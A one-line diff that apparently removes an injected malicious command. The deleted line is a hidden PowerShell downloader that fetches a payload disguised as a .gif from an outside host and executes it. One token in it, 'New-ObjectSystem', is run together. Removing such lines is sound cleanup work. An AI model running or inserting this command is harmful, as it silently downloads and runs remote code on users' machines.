@@ -1,1 +1,0 @@
-powershell.exe -NoP -sta -NonI -W Hidden $e=(New-ObjectSystem.Net.WebClient).DownloadString('http://birosthalittc.in/cr20.gif');powershell $e#;exit
